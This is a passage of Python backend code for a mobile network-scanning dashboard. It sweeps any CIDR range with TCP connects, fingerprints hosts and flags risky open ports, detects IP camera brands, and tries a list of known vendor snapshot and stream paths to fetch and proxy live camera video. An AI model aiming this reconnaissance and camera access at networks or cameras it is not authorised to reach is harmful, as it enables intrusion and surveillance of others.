        return {"ok": is_ok, "message": f"{name} corre dentro del proceso principal (in-process)" + ("" if is_ok else " — no se inicializó correctamente, revisa logs")}
    if not defn["cmd"]: return {"ok": True, "message": f"{name} always running"}
    with _svc_lock:
        proc = _svc_procs.get(name)
        if proc and proc.poll() is None: return {"ok": True, "message": f"{name} already running (PID {proc.pid})"}
        log_f = open(defn["log_file"], "a")
        proc = subprocess.Popen(defn["cmd"], stdout=log_f, stderr=log_f, cwd=str(ROOT))
        _svc_procs[name] = proc; _svc_start_times[name] = time.time()
        return {"ok": True, "message": f"{name} started (PID {proc.pid})"}

def _stop_service(name: str) -> dict:
    if name == "dashboard_server": return {"ok": False, "message": "Cannot stop self"}
    if SERVICE_DEFS.get(name, {}).get("in_process_flag"):
        return {"ok": False, "message": f"{name} corre in-process, no se puede detener sin reiniciar el dashboard"}
    with _svc_lock:
        proc = _svc_procs.get(name)
        if proc is None or proc.poll() is not None: return {"ok": True, "message": f"{name} not running"}
        proc.terminate()
        try: proc.wait(timeout=5)
        except: proc.kill()
        return {"ok": True, "message": f"{name} stopped"}

def _restart_service(name: str) -> dict:
    _stop_service(name); time.sleep(1); return _start_service(name)

# ── Scan state ───────────────────────────────────────────────────────────────
_scan_lock = threading.Lock()
_scan_state = {"running": False, "last_result": None, "last_error": None, "progress": ""}

def _get_active_target() -> str:
    settings = _load_json(SETTINGS_FILE, {})
    return settings.get("api_url", "").strip()

# ── Camera brand detection ──────────────────────────────────────────────────
CAMERA_BRANDS = [
    (re.compile(r'hikvision|dvrdvs|webs\s+server', re.I), 'Hikvision'),
    (re.compile(r'dahua', re.I), 'Dahua'),
    (re.compile(r'axis', re.I), 'Axis'),
    (re.compile(r'foscam', re.I), 'Foscam'),
    (re.compile(r'netgear', re.I), 'Netgear'),
    (re.compile(r'reolink', re.I), 'Reolink'),
    (re.compile(r'amcrest', re.I), 'Amcrest'),
    (re.compile(r'vivotek', re.I), 'Vivotek'),
    (re.compile(r'hanwha|samsung\s+techwin', re.I), 'Hanwha/Samsung'),
    (re.compile(r'bosch', re.I), 'Bosch'),
    (re.compile(r'panasonic', re.I), 'Panasonic'),
    (re.compile(r'sony', re.I), 'Sony'),
    (re.compile(r'pelco', re.I), 'Pelco'),
    (re.compile(r'uniview|univideo', re.I), 'Uniview'),
    (re.compile(r'onvif', re.I), 'ONVIF Device'),
]

def _detect_camera_brand(banner_text: str) -> str:
    for pattern, brand in CAMERA_BRANDS:
        if pattern.search(banner_text): return brand
    return "Unknown"

# ── Router brand detection ───────────────────────────────────────────────────
ROUTER_BRANDS = [
    (re.compile(r'cisco|catalyst', re.I), 'Cisco'),
    (re.compile(r'mikrotik', re.I), 'MikroTik'),
    (re.compile(r'ubiquiti|edgeos|unifi', re.I), 'Ubiquiti'),
    (re.compile(r'tp-link|tplink', re.I), 'TP-Link'),
    (re.compile(r'juniper|srx', re.I), 'Juniper'),
    (re.compile(r'huawei', re.I), 'Huawei'),
    (re.compile(r'fortinet|fortigate', re.I), 'Fortinet'),
    (re.compile(r'asus', re.I), 'ASUS'),
    (re.compile(r'netgear', re.I), 'Netgear'),
]

def _detect_router_brand(banner_text: str) -> str:
    for pattern, brand in ROUTER_BRANDS:
        if pattern.search(banner_text): return brand
    return "Unknown"

async def _http_banner(host: str, port: int, path: str = "/", timeout: float = 2.0, use_https: bool = False) -> dict:
    """Versión async con httpx.AsyncClient — la versión anterior usaba
    urllib.request.urlopen() BLOQUEANTE y congelaba el event loop."""
    scheme = "https" if use_https else "http"
    url = f"{scheme}://{host}:{port}{path}"
    try:
        async with httpx.AsyncClient(follow_redirects=True, timeout=timeout, verify=False) as client:
            resp = await client.get(url, headers={"User-Agent": "SourceSeal-NetScan/3.0"})
            return {"ok": True, "status": resp.status_code, "server": resp.headers.get("Server", ""),
                    "body_preview": resp.text[:200], "url": url}
    except Exception as e:
        return {"ok": False, "status": 0, "server": "", "body_preview": "", "url": url, "error": str(e)[:100]}

# ── Video URL detection ──────────────────────────────────────────────────────
CAM_VIDEO_PATHS = [
    ("/snapshot.cgi", "snapshot", "image/jpeg"),
    ("/mjpg/video.mjpg", "mjpeg", "multipart/x-mixed-replace"),
    ("/cgi-bin/viewer/video.jpg", "snapshot", "image/jpeg"),
    ("/ISAPI/Streaming/channels/1/picture", "snapshot", "image/jpeg"),
    ("/onvif/device_service", "onvif", "application/soap+xml"),
    ("/live/cam.html", "html", "text/html"),
    ("/video/mjpg.cgi", "mjpeg", "multipart/x-mixed-replace"),
]

def _detect_video_urls(host: str, port: int = 80, timeout: float = 2.0) -> list:
    sources = []
    for path, vtype, expected_ct in CAM_VIDEO_PATHS:
        try:
            scheme = "https" if port in (443, 8443) else "http"
            url = f"{scheme}://{host}:{port}{path}"
            ctx = None
            if scheme == "https":
                ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
            req = urllib.request.Request(url, headers={"User-Agent": "SourceSeal-VideoDetect/3.0"})
            opener = urllib.request.build_opener(
                urllib.request.HTTPSHandler(context=ctx) if scheme == "https" else urllib.request.HTTPHandler())
            try:
                with opener.open(req, timeout=timeout) as resp:
                    ct = resp.headers.get("Content-Type", "")
                    vendor = _detect_camera_brand(resp.headers.get("Server", "") + " " + resp.read(512).decode("utf-8", errors="replace"))
                    sources.append({"path": path, "port": port, "type": vtype, "vendor": vendor, "available": True,
                        "stream_url": f"/api/iot/stream?ip={host}&port={port}&path={urllib.parse.quote(path, safe='')}" if vtype == "mjpeg" else None,
                        "snapshot_url": f"/api/iot/snapshot?ip={host}&port={port}&path={urllib.parse.quote(path, safe='')}" if vtype == "snapshot" else None,
                        "rtsp_url": f"rtsp://{host}:554", "content_type": ct})
            except urllib.error.HTTPError as e:
                if e.code in (401, 403):
                    sources.append({"path": path, "port": port, "type": vtype, "vendor": _detect_camera_brand(e.headers.get("Server","") if e.headers else ""),
                        "available": False, "stream_url": None,
                        "snapshot_url": f"/api/iot/snapshot?ip={host}&port={port}&path={urllib.parse.quote(path, safe='')}",
                        "rtsp_url": f"rtsp://{host}:554", "content_type": "auth-required", "note": "Requiere autenticación"})
        except: pass
    return sources

# ── Config files ──────────────────────────────────────────────────────────────
def _list_config_files() -> list:
    out = []
    for name in ["requirements.txt", ".replit", "README.md"]:
        full = ROOT / name
        if full.exists():
            out.append({"name": name, "path": name, "size": full.stat().st_size,
                        "modified": datetime.fromtimestamp(full.stat().st_mtime).isoformat()})
    return out

# ═════════════════════════════════════════════════════════════════════════════
#  ENDPOINTS — ESCANEO DE RED
# ═════════════════════════════════════════════════════════════════════════════

# Puertos "huella digital" para clasificar tipo de dispositivo sin nmap -O
# (nmap -O necesita root/raw sockets, no disponible en Termux sin root)
FINGERPRINT_PORTS = [21, 22, 23, 80, 443, 554, 1883, 1900, 2323, 5000, 5683,
                      7070, 8000, 8080, 8443, 8554, 9000, 37777, 47808, 62078]

SERVICE_NAMES = {
    21: "ftp", 22: "ssh", 23: "telnet", 80: "http", 443: "https",
    554: "rtsp", 1883: "mqtt", 1900: "upnp/ssdp", 2323: "telnet-alt",
    5000: "http-alt", 5683: "coap", 7070: "rtsp-alt", 8000: "http-alt",
    8080: "http-proxy", 8443: "https-alt", 8554: "rtsp-alt",
    9000: "http-alt", 37777: "dahua-dvr", 47808: "bacnet", 62078: "lockdownd",
}

# Puertos que implican riesgo alto si estan abiertos sin mas contexto
HIGH_RISK_PORTS = {23: "Telnet expuesto (texto plano)", 21: "FTP expuesto (texto plano)",
                    2323: "Telnet alterno expuesto"}
MEDIUM_RISK_PORTS = {8080: "Panel admin HTTP sin cifrar", 80: "Panel admin HTTP sin cifrar",
                      1900: "UPnP expuesto (SSDP)"}

async def _fingerprint_host(ip: str) -> dict:
    """Sondea puertos comunes en un host para: 1) clasificar tipo de dispositivo,
    2) calcular nivel de riesgo real, 3) capturar banner/marca. Todo con TCP connect
    puro (asyncio), sin necesitar root."""
    tasks = [tcp_check(ip, p, timeout=0.9) for p in FINGERPRINT_PORTS]
    banners = await asyncio.gather(*tasks)
    open_ports = {p: b for p, b in zip(FINGERPRINT_PORTS, banners) if b is not None}

    dev_type = "unknown"
    vendor = None
    risk = "low"
    risk_reasons = []

    if any(p in open_ports for p in (554, 8554, 37777)):
        dev_type = "camera"
        vendor = _detect_camera_brand(" ".join(open_ports.values()))
    elif any(p in open_ports for p in (1883, 5683, 47808)):
        dev_type = "iot"
    elif 62078 in open_ports:
        dev_type = "iot"
        vendor = "Apple (lockdownd)"
    elif any(p in open_ports for p in (80, 443, 8080, 8443, 22, 23, 1900)) and len(open_ports) >= 1:
        http_banner = {}
        for http_port, is_https in ((80, False), (8080, False), (443, True), (8443, True)):
            if http_port in open_ports:
                http_banner = await _http_banner(ip, http_port, timeout=1.5, use_https=is_https)
                break
        combined = (http_banner.get("server", "") + " " + http_banner.get("body_preview", "")
                    + " " + " ".join(open_ports.values()))
        detected_vendor = _detect_router_brand(combined)
        if detected_vendor != "Unknown" or 1900 in open_ports:
            dev_type = "router"
            vendor = detected_vendor if detected_vendor != "Unknown" else None

    for p in open_ports:
        if p in HIGH_RISK_PORTS:
            risk = "high"; risk_reasons.append(HIGH_RISK_PORTS[p])
        elif p in MEDIUM_RISK_PORTS and risk == "low":
            risk = "medium"; risk_reasons.append(MEDIUM_RISK_PORTS[p])
    if dev_type == "camera" and risk == "low":
        risk = "medium"; risk_reasons.append("Cámara IP detectada — verificar credenciales por defecto")

    return {"type": dev_type, "vendor": vendor, "risk": risk, "risk_reasons": risk_reasons,
            "ports": sorted(open_ports.keys()), "banners": open_ports}

# ── Descubrimiento de hosts SIN nmap/root ────────────────────────────────────
# Por que: nmap -sn (ping scan) usa ICMP echo + ARP + TCP SYN "half-open",
# todo via raw sockets que requieren CAP_NET_RAW. En Termux sin root, el
# binario de nmap tipicamente NO tiene esa capacidad seteada -> nmap se
# ejecuta pero descubre 0 hosts SIEMPRE, sin importar cuantos dispositivos
# reales haya en la red (camaras, routers, etc.). Este fallback usa TCP
# connect() normal (sin privilegios especiales): un RST/ConnectionRefused
# confirma que el host esta VIVO (alguien respondio, aunque el puerto este
# cerrado) -- no solo un timeout indica host caido.
_DISCOVERY_PORTS = [80, 443, 22, 554, 8080, 8000, 23, 21, 445, 139, 53,
                     8443, 62078, 1900, 37777, 8081, 88]

async def _tcp_host_alive(ip: str, ports: list, timeout: float = 0.5) -> bool:
    for port in ports:
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(ip, port), timeout=timeout)
            writer.close()
            try: await writer.wait_closed()
            except: pass
            return True  # conexion abierta = vivo
        except ConnectionRefusedError:
            return True  # RST = el host respondio, esta vivo (puerto cerrado)
        except (asyncio.TimeoutError, OSError):
            continue  # sin respuesta en este puerto, probar el siguiente
    return False

def _get_scan_ports() -> list:
    """Lee los puertos configurados por el usuario en ops_config.json.
    Si no hay config o esta vacio, usa los defaults del codigo."""
    try:
        ops = _load_ops()
        ports_str = ops.get("scan_ports", "")
        if ports_str:
            return [int(p.strip()) for p in ports_str.split(",") if p.strip().isdigit()]
    except Exception:
        pass
    return _DISCOVERY_PORTS

def _get_scan_timeout() -> float:
    try:
        return float(_load_ops().get("scan_timeout", 0.5))
    except Exception:
        return 0.5

async def _discover_hosts_tcp(subnet: str) -> list:
    """Escanea cualquier red CIDR (/24, /22, /16, etc.) via TCP connect puro.
    Funciona en Termux sin root. Usa chunking para no saturar la memoria
    del celular cuando la red es grande (>254 hosts)."""
    import ipaddress as _ipa
    try:
        net = _ipa.ip_network(subnet, strict=False)
        all_hosts = [str(h) for h in net.hosts()]
    except Exception:
        # Fallback: asumir /24 con formato viejo
        try:
            base = subnet.split("/")[0].rsplit(".", 1)[0] + "."
        except Exception:
            return []
        all_hosts = [f"{base}{i}" for i in range(1, 255)]

    ports = _get_scan_ports()
    timeout = _get_scan_timeout()

    # Chunking: procesar en lotes de 64 hosts para no crear 1000+ tasks
    # de golpe y saturar la memoria del celular.
    CHUNK_SIZE = 64
    MAX_CONCURRENT = 32  # conexiones TCP simultaneas dentro de cada chunk
    sem = asyncio.Semaphore(MAX_CONCURRENT)
    alive_hosts = []

    async def check(ip):
        async with sem:
            return ip if await _tcp_host_alive(ip, ports, timeout) else None

    for chunk_start in range(0, len(all_hosts), CHUNK_SIZE):
        chunk = all_hosts[chunk_start:chunk_start + CHUNK_SIZE]
        results = await asyncio.gather(*[check(ip) for ip in chunk])
        alive_hosts.extend([ip for ip in results if ip])

    return alive_hosts


# ── Escaneo por chunks con streaming SSE para redes grandes ─────────────────
@app.get("/api/scan/network/stream")
async def scan_network_stream(subnet: str = ""):
    """Escaneo de red SSE en vivo. Soporta cualquier CIDR (/24, /22, /16, etc.).
    Usa chunking automatico para no saturar el celular en redes grandes.
    Envia resultados parciales via SSE a medida que encuentra hosts."""
    import ipaddress as _ipa

    if not subnet:
        ops_subnet = _load_ops().get("scan_subnet", "")
        if ops_subnet and "/" in ops_subnet:
            subnet = ops_subnet
        else:
            subnet = await asyncio.to_thread(subnet_from_iface)

    try:
        net = _ipa.ip_network(subnet, strict=False)
        all_hosts = [str(h) for h in net.hosts()]
    except Exception:
        return JSONResponse({"error": f"CIDR inválido: {subnet}"}, status_code=400)

    total = len(all_hosts)
    ports = _get_scan_ports()
    timeout = _get_scan_timeout()

    # Chunking adaptativo: 64 hosts por chunk, 32 concurrentes por chunk
    CHUNK_SIZE = 64
    MAX_CONCURRENT = 32
    sem = asyncio.Semaphore(MAX_CONCURRENT)

    async def check(ip):
        async with sem:
            return ip if await _tcp_host_alive(ip, ports, timeout) else None

    async def event_stream():
        scanned = 0
        found = 0
        alive_hosts = []

        # Enviar info inicial
        yield f"data: {json.dumps({'type': 'start', 'subnet': subnet, 'total': total})}\n\n"

        for chunk_start in range(0, total, CHUNK_SIZE):
            chunk = all_hosts[chunk_start:chunk_start + CHUNK_SIZE]
            results = await asyncio.gather(*[check(ip) for ip in chunk])
            chunk_alive = [ip for ip in results if ip]

            for ip in chunk_alive:
                alive_hosts.append(ip)
                found += 1
                yield f"data: {json.dumps({'type': 'host', 'ip': ip, 'found': found})}\n\n"

            scanned += len(chunk)
            progress = min(100, int(scanned * 100 / total))
            yield f"data: {json.dumps({'type': 'progress', 'scanned': scanned, 'total': total, 'progress': progress, 'found': found})}\n\n"

            # Broadcast por WebSocket tambien
            await broadcast({"type": "scan_progress", "scanned": scanned, "total": total, "found": found})

        # Fingerprint de hosts encontrados (en paralelo, sin bloquear)
        if alive_hosts:
            fp_sem = asyncio.Semaphore(16)
            async def fp_safe(ip):
                async with fp_sem:
                    return await _fingerprint_host(ip)
            fp_results = await asyncio.gather(*[fp_safe(ip) for ip in alive_hosts])

            hosts_data = []
            for ip, fp in zip(alive_hosts, fp_results):
                host = {
                    "ip": ip,
                    "type": fp["type"],
                    "ports": [
                        {"port": p, "service": SERVICE_NAMES.get(p, "unknown"),
                         "state": "open", "banner": (fp["banners"].get(p) or "")[:80]}
                        for p in fp["ports"]
                    ],
                    "risk": fp["risk"],
                    "risk_reasons": fp["risk_reasons"],
                    "vendor": fp.get("vendor"),
                    "status": "up"
                }
                hosts_data.append(host)
                yield f"data: {json.dumps({'type': 'host_detail', 'host': host})}\n\n"

            yield f"data: {json.dumps({'type': 'complete', 'found': found, 'total': total, 'hosts': hosts_data})}\n\n"
        else:
            yield f"data: {json.dumps({'type': 'complete', 'found': 0, 'total': total, 'hosts': []})}\n\n"

        await broadcast({"type": "scan_complete", "found": found, "total": total})

    return StreamingResponse(event_stream(), media_type="text/event-stream")

@app.get("/api/network/info")
async def network_info():
    """Info de red REAL instantanea (sin escaneo). Usada por el frontend para
    auto-poblar el campo de subred en vez de depender de un '192.168.1'
    hardcodeado que casi nunca coincide con la red real del dispositivo
    (hotspots Android suelen usar 192.168.43.x, 192.168.49.x, etc.)."""
    subnet = await asyncio.to_thread(subnet_from_iface)
    net = _detect_local_network()
    return {"subnet": subnet, "local_ip": net.get("ip", ""),
            "local_hostname": socket.gethostname() if hasattr(socket, "gethostname") else ""}

@app.post("/api/scan/topology")
async def scan_topology(subnet: str = ""):
    # Subnet como parametro query, o de Settings, o auto-detectada
    if not subnet:
        ops_subnet = _load_ops().get("scan_subnet", "")
        if ops_subnet and "/" in ops_subnet:
            subnet = ops_subnet
        else:
            subnet = await asyncio.to_thread(subnet_from_iface)
    # nmap con timeout adaptativo: mas hosts = mas timeout
    import ipaddress as _ipa
    try:
        net_size = len(list(_ipa.ip_network(subnet, strict=False).hosts()))
        nmap_timeout = min(300, max(90, net_size // 5))
    except Exception:
        nmap_timeout = 90
    ok, out = await _nmap_or_empty(["nmap", "-sn", "-T4", "-n", "--max-retries", "1", subnet], timeout=nmap_timeout)
    hosts, current = [], None
    nmap_note = None
    if not ok:
        # nmap no disponible o fallo -- no abortar, usar el fallback TCP.
        nmap_note = out
    else:
        for line in out.splitlines():
            if "Nmap scan report for" in line:
                ip = line.split()[-1].strip("()")
                current = {"ip": ip, "mac": None, "vendor": None, "ports": [], "type": "unknown", "status": "up"}
                hosts.append(current)
            elif current and "MAC Address" in line:
                parts = line.split()
                if len(parts) >= 3:
                    current["mac"] = parts[2]
                    if len(parts) > 3: current["vendor"] = " ".join(parts[3:]).strip("()") or "unknown"

    # Fallback: si nmap fallo o encontro 0 hosts, es casi siempre porque el
    # binario no tiene CAP_NET_RAW en Termux (comun sin root) -- ICMP/ARP/SYN
    # crudo no funcionan sin esa capacidad y nmap -sn se queda en silencio con
    # "0 hosts up" en vez de dar un error claro. TCP connect() puro SI funciona
    # sin privilegios especiales: un RST confirma host vivo aunque el puerto
    # este cerrado. Sin este fallback, camaras/routers reales nunca aparecen.
    used_tcp_fallback = False
    if len(hosts) == 0:
        used_tcp_fallback = True
        tcp_ips = await _discover_hosts_tcp(subnet)
        hosts = [{"ip": ip, "mac": None, "vendor": None, "ports": [], "type": "unknown", "status": "up"}
                 for ip in tcp_ips]

    # Clasificar tipo + riesgo real de cada host (en paralelo, sin bloquear)
    if hosts:
        fp_results = await asyncio.gather(*[_fingerprint_host(h["ip"]) for h in hosts])
        for h, fp in zip(hosts, fp_results):
            h["type"] = fp["type"]
            # El frontend (useScanStore.classifyRisk) espera objetos {port, service, banner},
            # no una lista plana de numeros — por eso antes el risk score se quedaba en 0%.
            h["ports"] = [
                {"port": p, "service": SERVICE_NAMES.get(p, "unknown"),
                 "state": "open", "banner": (fp["banners"].get(p) or "")[:80]}
                for p in fp["ports"]
            ]
            h["risk"] = fp["risk"]
            h["risk_reasons"] = fp["risk_reasons"]
            if fp["vendor"] and not h.get("vendor"):
                h["vendor"] = fp["vendor"]

    await broadcast({"type": "progress", "payload": f"Topología: {len(hosts)} hosts en {subnet}" + (" (via TCP fallback)" if used_tcp_fallback else "")})
    local_ip = _detect_local_network().get("ip", "")
    local_hostname = socket.gethostname() if hasattr(socket, "gethostname") else ""
    return {"results": hosts, "hosts_up": len(hosts), "subnet": subnet,
            "local_ip": local_ip, "local_hostname": local_hostname,
            "method": "tcp-connect" if used_tcp_fallback else "nmap",
            "nmap_note": nmap_note if used_tcp_fallback else None}

# ── Cámaras ──────────────────────────────────────────────────────────────────
CAM_PORTS = [554, 80, 443, 8000, 8080, 37777, 8554]

@app.post("/api/network/cameras")
@app.post("/api/scan/cameras")
async def scan_cameras():
    subnet = await asyncio.to_thread(subnet_from_iface)
    base = subnet.rsplit(".", 1)[0] + "."
    rtsp_tasks = [tcp_check(f"{base}{i}", 554, timeout=1.0) for i in range(1, 255)]
    rtsp_banners = await asyncio.gather(*rtsp_tasks)
    cams = []
    extra_ports = [p for p in CAM_PORTS if p != 554]
    for i, banner in enumerate(rtsp_banners, start=1):
        if banner is None: continue
        ip = f"{base}{i}"
        extra_tasks = [tcp_check(ip, p, timeout=0.8) for p in extra_ports]
        extra_results = await asyncio.gather(*extra_tasks)
        ports_map = {p: b for p, b in zip(extra_ports, extra_results)}
        cams.append({"ip": ip, "rtsp": banner, "ports": ports_map,
                     "type": "camera", "first_seen": datetime.now().isoformat()})
    await broadcast({"type": "progress", "payload": f"Cámaras encontradas: {len(cams)}"})
    return {"results": cams, "count": len(cams)}

# ── Routers ──────────────────────────────────────────────────────────────────
ROUTER_PORTS = [80, 443, 22, 23, 8080, 8443, 1900]

@app.post("/api/scan/routers")
@app.get("/api/network/routers")
async def scan_routers():
    subnet = await asyncio.to_thread(subnet_from_iface)
    base = subnet.rsplit(".", 1)[0] + "."
    candidates = [f"{base}{i}" for i in (1, 2, 3, 4, 254)]
    results = []
    for ip in candidates:
        port_tasks = [tcp_check(ip, p, timeout=0.8) for p in ROUTER_PORTS]
        banners = await asyncio.gather(*port_tasks)
        ports_map = {p: b for p, b in zip(ROUTER_PORTS, banners)}
        if any(banners):
            # Detectar marca via HTTP banner
            http_banner = await _http_banner(ip, 80, timeout=2.0)
            vendor = _detect_router_brand(http_banner.get("server", "") + " " + http_banner.get("body_preview", ""))
            results.append({"ip": ip, "ports": ports_map, "type": "router",
                           "vendor": vendor, "first_seen": datetime.now().isoformat()})
    return {"results": results, "count": len(results)}

# ── IoT ──────────────────────────────────────────────────────────────────────
@app.post("/api/scan/iot")
@app.get("/api/iot")
async def scan_iot():
    subnet = await asyncio.to_thread(subnet_from_iface)
    ok, out = await _nmap_or_empty(["nmap", "-sV", "-p", "1883,5683,502,47808", "-T3", subnet], timeout=90)
    if not ok:
        return JSONResponse({"error": out, "results": [], "raw": ""}, status_code=500)
    return {"results": out.splitlines(), "raw": out[:8000]}

# ── WiFi ─────────────────────────────────────────────────────────────────────
@app.post("/api/scan/wifi")
async def scan_wifi():
    iface = "wlan0"
    try:
        out = await asyncio.to_thread(lambda: subprocess.check_output(["iwlist", iface, "scan"], timeout=20, stderr=subprocess.DEVNULL).decode())
    except FileNotFoundError:
        try:
            out = await asyncio.to_thread(lambda: subprocess.check_output(["iw", "dev", iface, "scan"], timeout=20, stderr=subprocess.DEVNULL).decode())
        except Exception as e:
            return JSONResponse({"error": f"iwlist/iw no disponible: {e}"}, status_code=500)
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=500)
    return {"results": out[:4000]}

# ── Antenna/Radio ────────────────────────────────────────────────────────────
RADIO_PORTS = [(8000, "Icecast/ShoutCast"), (8001, "ShoutCast-alt"), (8080, "HTTP-stream"),
    (8443, "HTTPS-stream"), (1755, "MMS"), (554, "RTSP-audio"), (7070, "RTSP-alt"),
    (3000, "HTTP-radio"), (9000, "Icecast-alt"), (10000, "Webmin/radio")]

@app.post("/api/scan/antenna")
@app.post("/api/scan/radio")
@app.get("/api/network/radio")
async def scan_radio():
    subnet = subnet_from_iface()
    base = subnet.rsplit(".", 1)[0] + "."
    # Paralelizar: lanzar todos los tcp_check a la vez con un semaphore
    # para no saturar el event loop (254 IPs × 10 puertos = 2540 checks)
    sem = asyncio.Semaphore(200)

    async def check_one(ip, port, label):
        async with sem:
            banner = await tcp_check(ip, port, timeout=0.3)
            if banner is not None:
                return {"ip": ip, "port": port, "protocol": label,
                        "banner": banner[:80], "type": "radio"}
            return None

    tasks = []
    for i in range(1, 255):
        ip = f"{base}{i}"
        for port, label in RADIO_PORTS:
            tasks.append(check_one(ip, port, label))

    raw = await asyncio.gather(*tasks)
    results = [r for r in raw if r is not None]
    return {"results": results, "count": len(results)}

# ── IoT scan por CIDR (escanear red específica) ────────────────────────────────
@app.post("/api/iot/scan-network")
async def iot_scan_network(body: dict = Body(...)):
    """Escanea una red CIDR específica en busca de cámaras IP y dispositivos con puertos abiertos."""
    import ipaddress as _ipa
    cidr = str(body.get("cidr", "")).strip()
    if not cidr:
        return JSONResponse({"error": "cidr requerido (ej: 192.168.1.0/24)"}, status_code=400)
    try:
        net = _ipa.ip_network(cidr, strict=False)
    except Exception:
        return JSONResponse({"error": f"CIDR inválido: {cidr}"}, status_code=400)
    
    hosts = [str(h) for h in net.hosts()]
    # Escanear puertos de cámara + comunes
    SCAN_PORTS = [554, 80, 443, 8080, 8000, 37777, 8554, 23, 22]
    
    cameras = []
    all_devices = []
    
    # Chunking para redes grandes: 64 hosts por lote, 32 concurrentes
    CHUNK_SIZE = 64
    IOT_SEM = asyncio.Semaphore(32)
    
    async def scan_ip(ip: str):
        results = {}
        for port in SCAN_PORTS:
            async with IOT_SEM:
                b = await tcp_check(ip, port, timeout=1.0)
            if b is not None:
                results[port] = b[:80]
        return ip, results
    
    scan_results = []
    for chunk_start in range(0, len(hosts), CHUNK_SIZE):
        chunk = hosts[chunk_start:chunk_start + CHUNK_SIZE]
        tasks = [scan_ip(ip) for ip in chunk]
        chunk_results = await asyncio.gather(*tasks)
        scan_results.extend(chunk_results)
    
    for ip, ports in scan_results:
        if not ports:
            continue
        open_port_list = list(ports.keys())
        device_type = "device"
        brand = None
        
        if 554 in ports:
            brand = _detect_camera_brand(ports[554])
            cameras.append({
                "ip": ip, "port": 554, "protocol": "RTSP",
                "banner": ports[554], "brand": brand,
                "type": "camera",
                "ports_open": [f"{p}/tcp" for p in open_port_list],
            })
            device_type = "camera"
        
        all_devices.append({
            "ip": ip,
            "type": device_type,
            "vendor": brand or _detect_camera_brand(" ".join(ports.values())),
            "ports_open": [f"{p}/tcp" for p in open_port_list],
            "evidence": [{"port": p, "banner": b} for p, b in ports.items()],
        })
    
    await broadcast({"type": "progress", "payload": f"Scan completo: {len(cameras)} cámaras, {len(all_devices)} dispositivos"})
    
    return {
        "network": cidr,
        "total_ips": len(hosts),
        "total_scanned": len(hosts),
        "cameras_found": len(cameras),
        "devices_with_open_ports": len(all_devices),
        "cameras": cameras,
        "all_devices": all_devices,
        "full_results": [],
    }

# ── IoT video URLs ───────────────────────────────────────────────────────────
@app.post("/api/iot/scan-local")
async def iot_scan_local():
    """Detecta red local y escanea cámaras IPs en el rango detectado."""
    net = _detect_local_network()
    cidr = net["cidr"]
    base = cidr.rsplit(".", 1)[0] + "."
    # Escanear puerto 554 (RTSP) en toda la /24
    tasks = [tcp_check(f"{base}{i}", 554, timeout=1.0) for i in range(1, 255)]
    banners = await asyncio.gather(*tasks)
    cameras = []
    all_devices = []
    for i, b in enumerate(banners, start=1):
        ip = f"{base}{i}"
        if b is not None:
            cameras.append({"ip": ip, "port": 554, "protocol": "RTSP",
                          "banner": b[:80], "brand": _detect_camera_brand(b)})
        # Tambien check HTTP port 80
        http_b = await tcp_check(ip, 80, timeout=0.5)
        if http_b is not None or b is not None:
            all_devices.append({"ip": ip, "open_ports": [p for p, v in [(80, http_b), (554, b)] if v is not None]})
    return {
        "detected_ip": net["ip"], "detected_mask": net["mask"],
        "detected_cidr": cidr, "total_ips": 254,
        "total_scanned": 254, "cameras_found": len(cameras),
        "devices_with_open_ports": len(all_devices),
        "cameras": cameras, "all_devices": all_devices, "full_results": [],
    }

@app.get("/api/iot/video-urls")
async def iot_video_urls(ip: str = Query(...), port: int = Query(80)):
    sources = _detect_video_urls(ip, port)
    return {"ip": ip, "video_sources": sources, "total": len(sources)}

@app.get("/api/iot/snapshot")
async def iot_snapshot(ip: str = Query(...), port: int = Query(80), path: str = Query("/snapshot.cgi"),
                       user: str = Query(""), pwd: str = Query("")):
    """Fetch snapshot from camera. Tries auth if provided, falls back to common paths."""
    import httpx
    scheme = "https" if port in (443, 8443) else "http"
    base_url = f"{scheme}://{ip}:{port}"
    auth = None
    if user or pwd:
        auth = (user or "", pwd or "")

    # Paths de snapshot comunes por vendor (en orden de probabilidad)
    snapshot_paths = [
        path,  # El path proporcionado
        "/snapshot.cgi",
        "/cgi-bin/snapshot.cgi",
        "/image/jpeg.cgi",
        "/cgi-bin/viewer/video.jpg",
        "/tmpfs/auto.jpg",
        "/ISAPI/Streaming/channels/101/picture",
        "/onvif/snapshot",
        "/mjpg/snapshot.cgi",
        "/cgi-bin/view/snapshot.cgi",
        "/snapshot.jpg",
    ]
    # Elimar duplicados manteniendo orden
    seen = set()
    snapshot_paths = [p for p in snapshot_paths if not (p in seen or seen.add(p))]

    verify = False if scheme == "https" else True
    async with httpx.AsyncClient(timeout=8, verify=verify) as c:
        for snap_path in snapshot_paths:
            try:
                url = base_url + snap_path
                r = await c.get(url, auth=auth, follow_redirects=True,
                                headers={"User-Agent": "SourceSeal-Snapshot/3.1"})
                ct = r.headers.get("Content-Type", "")
                # Aceptar cualquier content-type que sea imagen o octet-stream
                if r.status_code == 200 and ("image" in ct or "octet-stream" in ct or len(r.content) > 1000):
                    return Response(content=r.content, media_type=ct or "image/jpeg")
            except Exception:
                continue

    return JSONResponse({"error": "Snapshot no disponible (prueba con credenciales)", "tried": len(snapshot_paths)}, status_code=502)

@app.get("/api/iot/stream")
async def iot_stream(ip: str = Query(...), port: int = Query(80), path: str = Query("/mjpg/video.mjpg"),
                     user: str = Query(""), pwd: str = Query("")):
    """Proxy MJPEG stream from camera to browser — allows live video in <img> tag."""
    import httpx
    scheme = "https" if port in (443, 8443) else "http"
    url = f"{scheme}://{ip}:{port}{urllib.parse.unquote(path)}"
    auth = None
    if user or pwd:
        auth = (user or "", pwd or "")

    async def generate():
        try:
            timeout = httpx.StreamTimeout(read=15, connect=5, write=5, pool=5)
            verify = False if scheme == "https" else True
            async with httpx.AsyncClient(timeout=timeout, verify=verify) as c:
                async with c.stream("GET", url, auth=auth, follow_redirects=True,
                                    headers={"User-Agent": "SourceSeal-Stream/3.1"}) as r:
                    if r.status_code != 200:
                        yield f'--boundary\r\nContent-Type: application/json\r\n\r\n{{"error": "HTTP {r.status_code}"}}\r\n'
                        return
                    async for chunk in r.aiter_bytes():
                        yield chunk
        except Exception as e:
            yield f'--boundary\r\nContent-Type: application/json\r\n\r\n{{"error": "{str(e)[:100]}"}}\r\n'

    return StreamingResponse(generate(), media_type="multipart/x-mixed-replace; boundary=--boundary")

